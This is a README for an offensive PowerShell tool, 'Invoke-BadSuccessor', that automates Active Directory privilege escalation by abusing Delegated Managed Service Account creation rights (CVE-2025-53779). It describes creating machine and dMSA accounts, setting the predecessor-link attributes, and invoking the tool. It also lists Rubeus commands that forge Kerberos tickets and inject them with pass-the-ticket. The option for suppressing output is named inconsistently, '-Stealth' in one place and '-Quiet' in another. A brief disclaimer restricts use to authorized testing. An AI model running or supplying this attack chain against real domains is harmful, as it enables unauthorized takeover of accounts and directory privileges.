# Invoke-BadSuccessor
Abuse **Delegated Managed Service Accounts (dMSA)** creation rights on vulnerable OUs to escalate privileges in Active Directory environments (BadSuccessor Vulnerability - CVE-2025-53779).

`Invoke-BadSuccessor` automatically:

- Identifies OUs where the current user (or their groups) has **CreateChild** rights  
- Creates (or reuses) a **machine account**  
- Creates (or reuses) a **Delegated MSA (dMSA)**  
- Grants the current user **GenericAll** over the dMSA  
- Configures:
  - `msDS-DelegatedMSAState = 2`
  - `msDS-ManagedAccountPrecededByLink = <DN>`  
- Generates **Rubeus-ready** post-exploitation steps (unless `-Stealth` is used)

This attack chain enables abusing dMSA behavior to escalate privileges by forging tickets using machine account credentials and requesting TGS for the service account.

---

## Features
- Fully automated dMSA privilege escalation chain  
- Stealth mode (`-Stealth`) to suppress post-exploitation tips  
- Smart identity resolution for PrecededBy targets
- Handles all edge cases (existing machine/MSA, bad DN, misconfigurations)  
- Works **purely with the AD PowerShell module** — no external dependencies

---

## Usage

### Create a machine + dMSA + configure escalation:
```powershell
Invoke-BadSuccessor
```

### Specify custom names:
```powershell
Invoke-BadSuccessor -ComputerName "WEB01" -ServiceAccountName "webpool_dMSA"
```

### Provide custom predecessor:
```powershell
Invoke-BadSuccessor -PrecededByIdentity "svc_app"
```

### Quiet Mode
```
Invoke-BadSuccessor -Quiet
```

### Requirements
- RSAT ActiveDirectory Module

### Post-Exploitation (Automated Output)
After execution, the script prints Rubeus commands such as:
```
Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:<domain>
Rubeus.exe asktgt /user:Pwn$ /aes256:<AES256KEY> /domain:<domain>
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/<domain> /dmsa /opsec /ptt /ticket:<BASE64TGT>
```
Unless "-Quiet" is used.

### ⚠️ Disclaimer
This tool is for educational and authorized penetration testing only.
Do not use this technique on systems you do not own or have explicit permission to test.




